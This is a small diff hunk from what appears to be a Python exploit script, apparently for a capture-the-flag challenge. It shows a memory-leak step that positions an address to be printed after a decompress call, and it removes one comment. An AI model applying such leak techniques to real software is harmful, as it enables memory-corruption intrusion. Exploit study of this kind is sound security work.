@@ -132,7 +132,6 @@ def get_unbounded_payload():
 leak_payload = get_unbounded_payload()
 
 # Move an address where it will be printed upon return from decompress.
-# We have to do this over two moves since the address is a bit far away.
 leak_payload.seek(u16(p16(-0xc0, sign=True)))
 leak_payload.repeat_bit(offset=0x68*8, count=0x40)
 
